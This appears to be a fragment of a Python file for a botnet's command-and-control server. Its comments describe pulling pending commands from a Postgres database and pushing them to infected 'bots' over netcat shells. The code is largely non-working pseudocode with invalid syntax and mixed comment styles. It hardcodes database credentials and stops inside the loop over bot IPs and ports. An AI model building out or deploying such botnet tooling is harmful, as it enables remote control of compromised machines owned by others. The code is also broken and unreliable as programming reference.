**
This python file is responsible for delivering the commands from the webserver to the bots.
If the webserver is holding pending commands, this will pull the commands, parse them, and
send them to the clients via open netcat terminals.  Once commands have been pushed to clients,
the clients will stop listening, and the the server will terminate all connections.
*/

import psycopg2		//postgres and python integration

pend_cmds = true
commands = [] 	//array that will hold strings, each string is a command to be executed


/**

/**
This function will parse commands from webserver into python strings
@returns: an array of strings, containing commands to be executed
*/ 
def read_cmds:
	if pend_cmds == true:
		query postgres for django json commands
		commands = results
		commands[length+1] = killnetcat command
		return commmands
*/


/**
This function will connect to the databse and for each entry, open netcat and execute commands
@arg commands: the array of commands that will be executed
@arg out_txt: the text file where command output from all the machines will be written
@returns: null
*/
def open_shells(commands)
	try:	#connect to DB
		conn = psycopg2.connect("dbname='bots' user='botuser' password='letmein'")
	except:
		print("Error: Could not connect to database."
		input("Press enter to exit program...")
		exit()
	
	cur = conn.cursor()
	
	try:	#select our bots
		cur.execute('SELECT * FROM online')
	except:
		print("Error: Could not select from online table")
		input("Press enter to exit program")
		exit()
	
	computers = cur.fetchall()	#stores bots' info in "computers"
	
	for computer in computers:
		mac = computer[0]
		ip = computer[1]
		port = computer[2]

		








		
		
